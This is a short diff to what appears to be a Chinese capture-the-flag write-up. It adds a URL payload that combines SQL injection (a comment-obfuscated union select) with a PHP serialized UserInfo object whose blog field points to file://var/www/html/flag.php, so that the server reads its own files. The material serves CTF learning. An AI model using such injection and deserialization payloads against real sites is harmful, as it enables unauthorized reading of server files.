@@ -88,5 +88,11 @@ $a = new UserInfo('1',2,'file://var/www/html/flag.php');
 O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:28:"file://var/www/html/flag.php";}
 ```
 
+将反序列化字符串放入url中构造payload：
+
+```
+no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:28:"file://var/www/html/flag.php";}'#
+```
+
 
 
